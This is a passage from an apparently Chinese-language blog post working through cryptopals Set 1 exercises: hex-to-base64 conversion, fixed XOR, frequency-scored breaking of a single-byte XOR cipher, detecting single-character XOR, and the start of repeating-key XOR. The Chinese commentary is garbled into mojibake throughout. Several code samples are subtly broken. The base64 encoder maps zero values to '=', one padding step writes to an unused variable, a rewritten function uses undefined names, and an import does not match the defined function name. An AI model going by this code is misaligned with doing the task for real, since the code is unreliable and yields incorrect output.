class="line">49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d</span><br></pre></td></tr></table></figure><p>Should produce:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t</span><br></pre></td></tr></table></figure><p>So go ahead and make that happen. Youâ€™ll need to use this code for the rest of the exercises. </p><p>å¤§æ¦‚å°±æ˜¯æ‰‹åŠ¨å†™ä¸€ä¸ªhex2base64çš„è„šæœ¬å§</p><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>å†™ä¹‹å‰å…ˆå»äº†è§£ä¸€ä¸‹hexè½¬base64çš„åŸç†(wikiçœŸä¸é”™<br><strong>Base64</strong>æ˜¯ä¸€ç§åŸºäº64ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®çš„è¡¨ç¤ºæ–¹æ³•ã€‚ç”±äº $log _2 64=6$ï¼Œæ‰€ä»¥æ¯6ä¸ªæ¯”ç‰¹ä¸ºä¸€ä¸ªå•å…ƒï¼Œå¯¹åº”æŸä¸ªå¯æ‰“å°å­—ç¬¦ã€‚3ä¸ªå­—èŠ‚ç›¸å½“äº24ä¸ªæ¯”ç‰¹ï¼Œå¯¹åº”äº4ä¸ªBase64å•å…ƒï¼Œå³3ä¸ªå­—èŠ‚å¯ç”±4ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºã€‚<br><img src="http://47.98.130.190:8090/upload/2020/10/%E5%9B%BE%E7%89%87-5317dc14984d42eda2d1023d847d30d7.png" alt="å›¾ç‰‡.png"></p><p>è½¬æ¢çš„æ—¶å€™ï¼Œå°†3å­—èŠ‚çš„æ•°æ®ï¼Œå…ˆåæ”¾å…¥ä¸€ä¸ª24ä½çš„ç¼“å†²åŒºä¸­ï¼Œå…ˆæ¥çš„å­—èŠ‚å é«˜ä½ã€‚æ•°æ®ä¸è¶³3å­—èŠ‚çš„è¯ï¼Œäºç¼“å†²å™¨ä¸­å‰©ä¸‹çš„æ¯”ç‰¹ç”¨0è¡¥è¶³ã€‚æ¯æ¬¡å–å‡º6æ¯”ç‰¹ï¼ŒæŒ‰ç…§å…¶å€¼é€‰æ‹©</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸­çš„å­—ç¬¦ä½œä¸ºç¼–ç åçš„è¾“å‡ºï¼Œç›´åˆ°å…¨éƒ¨è¾“å…¥æ•°æ®è½¬æ¢å®Œæˆã€‚</p><p>è‹¥åŸæ•°æ®é•¿åº¦ä¸æ˜¯3çš„å€æ•°æ—¶ä¸”å‰©ä¸‹1ä¸ªè¾“å…¥æ•°æ®ï¼Œåˆ™åœ¨ç¼–ç ç»“æœååŠ 2ä¸ª=ï¼›è‹¥å‰©ä¸‹2ä¸ªè¾“å…¥æ•°æ®ï¼Œåˆ™åœ¨ç¼–ç ç»“æœååŠ 1ä¸ª=ã€‚ </p><h2 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><p>çŸ¥é“åŸç†å°±å¥½å†™è„šæœ¬äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span>(<span class="params">Hex</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(Hex) % <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> Hex + <span class="string">&#x27;0&#x27;</span> * (<span class="number">6</span> - <span class="built_in">len</span>(Hex) % <span class="number">6</span>)</span><br><span class="line">    <span class="keyword">return</span> Hex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeb64</span>(<span class="params">Hex</span>):</span></span><br><span class="line">    Hex = padding(Hex)</span><br><span class="line">    output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(Hex), <span class="number">6</span>):</span><br><span class="line">        buff = <span class="built_in">bin</span>(<span class="built_in">int</span>(Hex[i:i + <span class="number">6</span>], <span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">        buff = <span class="string">&#x27;0&#x27;</span> * (<span class="number">24</span> - <span class="built_in">len</span>(buff)) + buff</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(buff), <span class="number">6</span>):</span><br><span class="line">            value = <span class="built_in">int</span>(buff[j:j + <span class="number">6</span>], <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> value == <span class="number">0</span>:</span><br><span class="line">                output += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> value &lt; <span class="number">26</span>:</span><br><span class="line">                output += <span class="built_in">chr</span>(value + <span class="number">65</span>)</span><br><span class="line">            <span class="keyword">elif</span> value &lt; <span class="number">52</span>:</span><br><span class="line">                output += <span class="built_in">chr</span>(value + <span class="number">71</span>)</span><br><span class="line">            <span class="keyword">elif</span> value &lt; <span class="number">62</span>:</span><br><span class="line">                output += <span class="built_in">str</span>(value - <span class="number">52</span>)</span><br><span class="line">            <span class="keyword">elif</span> value == <span class="number">62</span>:</span><br><span class="line">                output += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                output += <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    Hex = <span class="string">&#x27;49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d&#x27;</span></span><br><span class="line">    print(encodeb64(Hex))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name='2'></a></p><h1 id="cryptopals-1-2-Fixed-XOR"><a href="#cryptopals-1-2-Fixed-XOR" class="headerlink" title="cryptopals 1.2 - Fixed XOR"></a>cryptopals 1.2 - Fixed XOR</h1><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p> Write a function that takes two equal-length buffers and produces their XOR combination.</p><p>If your function works properly, then when you feed it the string:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1c0111001f010100061a024b53535009181c</span><br></pre></td></tr></table></figure><p>â€¦ after hex decoding, and when XORâ€™d against:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">686974207468652062756c6c277320657965</span><br></pre></td></tr></table></figure><p>â€¦ should produce:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">746865206b696420646f6e277420706c6179</span><br></pre></td></tr></table></figure><p>ç›¸åŒé•¿åº¦çš„åå…­è¿›åˆ¶çš„xor, ä¸€ä½ä¸€ä½çš„xorå°±è¡Œäº†å§</p><h2 id="è„šæœ¬-1"><a href="#è„šæœ¬-1" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fixex_xor</span>(<span class="params">Hex1, Hex2</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(Hex1, Hex2):</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">int</span>(i, <span class="number">16</span>) ^ <span class="built_in">int</span>(j, <span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    Hex1 = <span class="string">&#x27;1c0111001f010100061a024b53535009181c&#x27;</span></span><br><span class="line">    Hex2 = <span class="string">&#x27;686974207468652062756c6c277320657965&#x27;</span></span><br><span class="line">    print(fixex_xor(Hex1, Hex2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><blockquote><p>è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„,åé¢å°±ä¸ä¸€å®šäº†Orz<br><a name='3'></a></p></blockquote><h1 id="cryptopals-1-3-Single-byte-XOR-cipher"><a href="#cryptopals-1-3-Single-byte-XOR-cipher" class="headerlink" title="cryptopals 1.3 - Single-byte XOR cipher"></a>cryptopals 1.3 - Single-byte XOR cipher</h1><blockquote><p>ä»è¿™é‡Œå¼€å§‹éš¾åº¦çªç„¶å°±ä¸Šå‡äº†</p></blockquote><h2 id="é¢˜ç›®-1"><a href="#é¢˜ç›®-1" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p> The hex encoded string:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736</span><br></pre></td></tr></table></figure><p>â€¦ has been XORâ€™d against a single character. Find the key, decrypt the message.</p><p>You can do this by hand. But donâ€™t: write code to do it for you.</p><p>How? Devise some method for â€œscoringâ€ a piece of English plaintext. Character frequency is a good metric. Evaluate each output and choose the one with the best score. </p><p>è¯´æ˜¯ä¸€æ®µæ–‡å­—è¢«å•ä¸ªå­—ç¬¦(8bit)å¼‚æˆ–åŠ å¯†äº†, è¦æ‰¾å‡ºè¿™ä¸ªå­—ç¬¦ç„¶åè¾“å‡ºæ˜æ–‡, å¯†é’¥ç©ºé—´ä¸º$2^8$, ä¹Ÿä¸ç®—å¤š, ä½†æ˜¯å¦‚ä½•è®©ç¨‹åºæ‰¾å‡ºå”¯ä¸€ä¸€ä¸ªæ­£ç¡®çš„å­—ç¬¦?</p><p>æç¤ºä¸Šæœ‰æåˆ°å¯ä»¥åˆ©ç”¨è§£å¯†åçš„å­—ç¬¦ä¸²çš„â€å¾—åˆ†â€. æŸ¥äº†ä¸€ä¸‹, åœ¨ä¸€ä¸ªdalaoçš„åšå®¢ä¸Šæ‰¾åˆ°çš„è¿™ä¸ªå¾—åˆ†åº”è¯¥å«<strong>å­—ç¬¦é¢‘ç‡</strong>(dalaoè¯´wikiä¸Šæœ‰å­—ç¬¦é¢‘ç‡è¡¨, ä½†æˆ‘æ²¡æ‰¾åˆ°, å°±è¿è¿™ä¸ªâ€å¾—åˆ†â€çš„ç›¸å…³å†…å®¹éƒ½æ²¡æ‰¾åˆ°), ä½†æ˜¯è¿˜å¥½ä»–çš„åšå®¢é‡Œé™„å¸¦äº†ä¸€ä¸ªå­—ç¬¦é¢‘ç‡çš„æ•°ç»„.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CHARACTER_FREQ = &#123; <span class="comment">#å­—ç¬¦é¢‘ç‡è¡¨, å‡ºç°ä¸€æ¬¡æŸå­—æ¯çš„å¾—åˆ†</span></span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="number">0.0651738</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">0.0124248</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">0.0217339</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">0.0349835</span>, <span class="string">&#x27;e&#x27;</span>: <span class="number">0.1041442</span>, <span class="string">&#x27;f&#x27;</span>: <span class="number">0.0197881</span>, <span class="string">&#x27;g&#x27;</span>: <span class="number">0.0158610</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="number">0.0492888</span>, <span class="string">&#x27;i&#x27;</span>: <span class="number">0.0558094</span>, <span class="string">&#x27;j&#x27;</span>: <span class="number">0.0009033</span>, <span class="string">&#x27;k&#x27;</span>: <span class="number">0.0050529</span>, <span class="string">&#x27;l&#x27;</span>: <span class="number">0.0331490</span>, <span class="string">&#x27;m&#x27;</span>: <span class="number">0.0202124</span>, <span class="string">&#x27;n&#x27;</span>: <span class="number">0.0564513</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="number">0.0596302</span>, <span class="string">&#x27;p&#x27;</span>: <span class="number">0.0137645</span>, <span class="string">&#x27;q&#x27;</span>: <span class="number">0.0008606</span>, <span class="string">&#x27;r&#x27;</span>: <span class="number">0.0497563</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">0.0515760</span>, <span class="string">&#x27;t&#x27;</span>: <span class="number">0.0729357</span>, <span class="string">&#x27;u&#x27;</span>: <span class="number">0.0225134</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="number">0.0082903</span>, <span class="string">&#x27;w&#x27;</span>: <span class="number">0.0171272</span>, <span class="string">&#x27;x&#x27;</span>: <span class="number">0.0013692</span>, <span class="string">&#x27;y&#x27;</span>: <span class="number">0.0145984</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">0.0007836</span>, <span class="string">&#x27; &#x27;</span>: <span class="number">0.1918182</span>&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸ªå­—ç¬¦é¢‘ç‡è¡¨, å¯ä»¥å®šé‡çš„åˆ†ææ¯æ¬¡è§£å¯†ç»“æœçš„å¾—åˆ†, å¾—åˆ†æœ€é«˜å°±ä»£è¡¨æœ€æ¥è¿‘æ­£å¸¸è‹±æ–‡è¯­å¥(æˆ–è€…è¯´æ–‡ç« ).</p><h2 id="è„šæœ¬-2"><a href="#è„šæœ¬-2" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">CHARACTER_FREQ = &#123;  <span class="comment"># å­—ç¬¦é¢‘ç‡è¡¨, å‡ºç°ä¸€æ¬¡æŸå­—æ¯çš„å¾—åˆ†</span></span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="number">0.0651738</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">0.0124248</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">0.0217339</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">0.0349835</span>, <span class="string">&#x27;e&#x27;</span>: <span class="number">0.1041442</span>, <span class="string">&#x27;f&#x27;</span>: <span class="number">0.0197881</span>, <span class="string">&#x27;g&#x27;</span>: <span class="number">0.0158610</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="number">0.0492888</span>, <span class="string">&#x27;i&#x27;</span>: <span class="number">0.0558094</span>, <span class="string">&#x27;j&#x27;</span>: <span class="number">0.0009033</span>, <span class="string">&#x27;k&#x27;</span>: <span class="number">0.0050529</span>, <span class="string">&#x27;l&#x27;</span>: <span class="number">0.0331490</span>, <span class="string">&#x27;m&#x27;</span>: <span class="number">0.0202124</span>, <span class="string">&#x27;n&#x27;</span>: <span class="number">0.0564513</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="number">0.0596302</span>, <span class="string">&#x27;p&#x27;</span>: <span class="number">0.0137645</span>, <span class="string">&#x27;q&#x27;</span>: <span class="number">0.0008606</span>, <span class="string">&#x27;r&#x27;</span>: <span class="number">0.0497563</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">0.0515760</span>, <span class="string">&#x27;t&#x27;</span>: <span class="number">0.0729357</span>, <span class="string">&#x27;u&#x27;</span>: <span class="number">0.0225134</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="number">0.0082903</span>, <span class="string">&#x27;w&#x27;</span>: <span class="number">0.0171272</span>, <span class="string">&#x27;x&#x27;</span>: <span class="number">0.0013692</span>, <span class="string">&#x27;y&#x27;</span>: <span class="number">0.0145984</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">0.0007836</span>, <span class="string">&#x27; &#x27;</span>: <span class="number">0.1918182</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Set1.Fixed_XOR <span class="keyword">import</span> fixed_xor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2text</span>(<span class="params">Hex</span>):</span></span><br><span class="line">    h = Hex</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(h) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        t = <span class="string">&#x27;0&#x27;</span> + h</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(b, <span class="number">16</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> [h[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(h), <span class="number">2</span>)]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>(<span class="params">LEN</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>): <span class="keyword">yield</span> ((<span class="number">2</span> - <span class="built_in">len</span>(<span class="built_in">hex</span>(i)[<span class="number">2</span>:])) * <span class="string">&#x27;0&#x27;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:]) * (LEN // <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getscore</span>(<span class="params">text</span>):</span></span><br><span class="line">    score = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        i = i.lower()</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> CHARACTER_FREQ:</span><br><span class="line">            score += CHARACTER_FREQ[i]</span><br><span class="line">    <span class="keyword">return</span> score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    generator = keygen(<span class="built_in">len</span>(cipher))</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> generator:</span><br><span class="line">        plain = hex2text(fixed_xor(cipher, i))</span><br><span class="line">        score = getscore(plain)</span><br><span class="line">        res.append([plain, score, i])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    cipher = <span class="string">&#x27;1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736&#x27;</span></span><br><span class="line">    <span class="built_in">max</span> = [<span class="number">0</span>, -<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> attack(cipher):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">max</span>[<span class="number">1</span>] &lt; i[<span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">max</span> = i</span><br><span class="line">    print(<span class="built_in">max</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å…³äºæœ€åé¢çš„æ’åº, çœ‹äº†ç›¸å…³æ–‡ç« å‘ç°å…¶å®å¯ä»¥ç”¨<code>sorted()</code>å‡½æ•°</p><p>ç›´æ¥ä¸¾ä¾‹å­, ç®€å•æ˜“æ‡‚</p><ol><li>å¯¹é”®æ’åº<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dict1=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;e&#x27;</span>:<span class="number">3</span>,<span class="string">&#x27;f&#x27;</span>:<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>:<span class="number">4</span>&#125;</span><br><span class="line">list1= <span class="built_in">sorted</span>(dict1.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>])</span><br><span class="line">print(list1)</span><br></pre></td></tr></table></figure></li><li>å¯¹å€¼æ’åº<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dict1=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;e&#x27;</span>:<span class="number">3</span>,<span class="string">&#x27;f&#x27;</span>:<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>:<span class="number">4</span>&#125;</span><br><span class="line">list1= <span class="built_in">sorted</span>(dict1.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line">print(list1)</span><br></pre></td></tr></table></figure>å€Ÿç”¨å¤§ä½¬çš„ä»£ç , å…¶å®attackå‡½æ•°å¯ä»¥å†™æˆ<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">cipher</span>):</span> </span><br><span class="line">    generator = keygen(<span class="built_in">len</span>(cipher))</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> generator:</span><br><span class="line">        plain = hex2text(fixed_xor(cipher, i))</span><br><span class="line">        score = getscore(plain)</span><br><span class="line">        res.append(&#123;<span class="string">&#x27;key&#x27;</span>: key, <span class="string">&#x27;plaintext&#x27;</span>: plaintext, <span class="string">&#x27;score&#x27;</span>: score&#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(res, key = <span class="keyword">lambda</span> c:c[<span class="string">&#x27;score&#x27;</span>])</span><br></pre></td></tr></table></figure><a name='4'></a></li></ol><h1 id="cryptopals-1-4-Detect-single-character-XOR"><a href="#cryptopals-1-4-Detect-single-character-XOR" class="headerlink" title="cryptopals 1.4 - Detect single-character XOR"></a>cryptopals 1.4 - Detect single-character XOR</h1><h2 id="é¢˜ç›®-2"><a href="#é¢˜ç›®-2" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p> One of the 60-character strings in <a href="https://cryptopals.com/static/challenge-data/4.txt">this file</a> has been encrypted by single-character XOR.</p><p>Find it.</p><p>(Your code from #3 should help.) </p><p>æ„æ€æ˜¯è¯´, åœ¨é‚£ä¸ªæ–‡ä»¶é‡Œé¢çš„60ä¸ªå­—ç¬¦ä¸²é‡Œé¢, æœ‰ä¸€ä¸ªæ˜¯è¢«xoråŠ å¯†è¿‡åçš„(ä¸€å¼€å§‹è¯»é¢˜è¿˜ä»¥ä¸ºæ˜¯60ä¸ªéƒ½æ˜¯è¢«åŠ å¯†çš„), è®©æˆ‘ä»¬æ‰¾åˆ°ä»–å¹¶ä¸”è§£å¯†å‡ºæ¥.</p><p>å…¶å®è·Ÿ1.3æ²¡ä»€ä¹ˆåŒºåˆ«, åªæ˜¯ä»1ç»„é‡Œé¢é€‰å¾—åˆ†æœ€é«˜çš„å¯†é’¥å˜æˆå…ˆæ ¹æ®å¯†é’¥é€‰å‡º1ç»„é‡Œé¢æœ€é«˜åˆ†çš„, å†é€‰å‡º60ä¸ªå­—ç¬¦ä¸²é‡Œé¢æœ€é«˜åˆ†çš„é‚£ç»„.</p><h2 id="è„šæœ¬-3"><a href="#è„šæœ¬-3" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Single_byte_XOR_cipher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;4.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            cipher = f.readline()[:-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> cipher == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            res.append(attack(cipher)[-<span class="number">1</span>])</span><br><span class="line">    print(<span class="built_in">sorted</span>(res, key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;score&#x27;</span>])[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name='5'></a></p><h1 id="cryptopals-1-5-Implement-repeating-key-XOR"><a href="#cryptopals-1-5-Implement-repeating-key-XOR" class="headerlink" title="cryptopals 1.5 - Implement repeating-key XOR"></a>cryptopals 1.5 - Implement repeating-key XOR</h1><h2 id="é¢˜ç›®-3"><a href="#é¢˜ç›®-3" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p> Here is the opening stanza of an important work of the English language:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Burning &#39;em, if you ain&#39;t quick and nimble</span><br><span class="line">I go crazy when I hear a cymbal</span><br></pre></td></tr></table></figure><p>Encrypt it, under the key â€œICEâ€, using repeating-key XOR.</p><p>In repeating-key XOR, youâ€™ll sequentially apply each byte of the key; the first byte of plaintext will be XORâ€™d against I, the next C, the next E, then I again for the 4th byte, and so on.</p><p>It should come out to:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272</span><br><span 